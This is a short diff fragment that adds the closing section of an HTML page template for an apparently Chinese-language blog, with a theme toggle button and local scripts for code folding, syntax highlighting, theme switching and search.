+    <button id="themeToggle" class="theme-toggle" type="button" aria-label="切换主题" title="切换主题"></button>
+    <script src="/assets/js/site.js"></script>
+    <!-- 功能脚本（自动扫描 assets/features/ 目录） -->
+        <script src="/assets/features/code-fold/script.js"></script>
+        <script src="/assets/features/image-enhance/script.js"></script>
+        <script src="/assets/features/reading-progress/script.js"></script>
+        <script src="/assets/features/tax-accordion/script.js"></script>
+        <script src="/assets/js/navReveal.js"></script>
+    <!-- 启动代码高亮及行号显示 -->
+    <script src="/assets/prism/prism.js"></script>
+    <script src="/assets/prism/prism-line-number.js"></script>
+    <!-- 主题切换 -->
+    <script src="/assets/js/ThemeSwitch.js"></script>
+    <!-- 弹簧动画工具（搜索弹窗/灯箱进出场依赖） -->
+    <script src="/assets/js/spring.js"></script>
+    <!-- 搜索功能 -->
+    <script src="/assets/js/fuse.js"></script>
+    <script src="/assets/js/search.js"></script>
+</body>
+</html>
